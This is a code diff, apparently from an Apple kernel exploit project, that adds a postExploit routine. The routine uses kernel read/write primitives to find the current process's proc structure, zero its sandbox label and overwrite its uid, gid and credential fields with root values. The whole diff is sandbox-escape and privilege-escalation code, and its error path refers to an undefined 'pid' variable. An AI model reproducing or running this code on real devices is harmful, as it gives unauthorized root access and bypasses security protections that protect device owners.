@@ -25,6 +25,48 @@ uint64_t off_u_cr_groups = 0x28;
 uint64_t off_u_cr_rgid = 0x68;
 uint64_t off_u_cr_svgid = 0x6c;
 
+void postExploit(void) {
+    uint64_t proc = getProc(getpid());
+    if (proc == -1) {
+        printf("Failed to get proc for PID %d\n", pid);
+        return;
+    }
+    printf("proc: 0x%llx\n", proc);
+    uint64_t ucred = kread64(proc + off_p_ucred);
+    printf("ucred: 0x%llx\n", ucred);
+    uint64_t label = kread64(ucred + off_u_cr_label);
+    printf("label: 0x%llx\n", label);
+    //Escape Sandbox
+    kwrite64(label + 0x10, 0);
+    //Get Root
+    kwrite64(proc + off_p_uid, 0);
+    kwrite64(proc + off_p_ruid, 0);
+    kwrite64(proc + off_p_gid, 0);
+    kwrite64(proc + off_p_rgid, 0);
+    kwrite64(ucred + off_u_cr_uid, 0);
+    kwrite64(ucred + off_u_cr_ruid, 0);
+    kwrite64(ucred + off_u_cr_svuid, 0);
+    kwrite64(ucred + off_u_cr_ngroups, 1);
+    kwrite64(ucred + off_u_cr_groups, 0);
+    kwrite64(ucred + off_u_cr_rgid, 0);
+    kwrite64(ucred + off_u_cr_svgid, 0);
+    printf("Done!\n");
+}
+
+uint64_t getProc(pid_t pid) {
+    uint64_t proc = get_kernproc();
+    while (true) {
+        if(kread32(proc + off_p_pid) == pid) {
+            return proc;
+        }
+        proc = kread64(proc + 0x8);
+        if(!proc) {
+            return -1;
+        }
+    }
+    return 0;
+}
+
 uint32_t kread32(uint64_t where) {
     uint32_t out;
     kread(_kfd, where, &out, sizeof(uint32_t));
@@ -49,4 +91,3 @@ void kwrite64(uint64_t where, uint64_t what) {
     _buf[0] = what;
     kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
 }
-
